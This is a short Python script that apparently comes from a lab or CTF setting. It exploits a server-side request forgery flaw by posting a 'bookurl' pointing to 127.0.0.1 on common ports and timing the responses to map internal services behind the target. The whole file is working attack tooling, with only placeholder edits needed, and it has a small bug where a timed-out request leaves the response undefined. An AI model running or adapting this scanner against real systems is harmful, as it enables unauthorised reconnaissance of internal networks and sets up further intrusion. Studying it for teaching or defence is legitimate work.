#!/usr/bin/env python3


"""
Generic SSRF port discovery helper.

This script demonstrates how SSRF vulnerabilities can be abused
to perform internal port discovery.

Educational purpose only.
"""


import sys, requests, time
from termcolor import colored 
from concurrent.futures import ThreadPoolExecutor

url = "http://target/endpoint" # change this

def fuzz(ports):
    data_post = {"bookurl": f"http://127.0.0.1:{ports}"} # and this
    content = {"bookfile": " "} # and this

    start = time.time()

    try:
        r = requests.post(url=url, data=data_post, files=content, timeout=2)
    except KeyboardInterrupt:
        print(colored("\n[!] Exit....", "red"))
        sys.exit(1)

    end = time.time() - start
    end_round = round(end, 2)

    print(f"{ports} : {r.text} : time={end_round}")

def main():
   
    # ports = range(1, 65535)
    ports = [80, 443, 3000, 5000, 8000, 8080, 8443, 9000]

    print(f"\n[+] Début du scan de port au: {url}\n")

    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
                executor.map(fuzz, ports)

    except KeyboardInterrupt:
        print(colored("\n[!] Exit....", "red"))
        sys.exit(1)


if __name__ == "__main__":
    main()
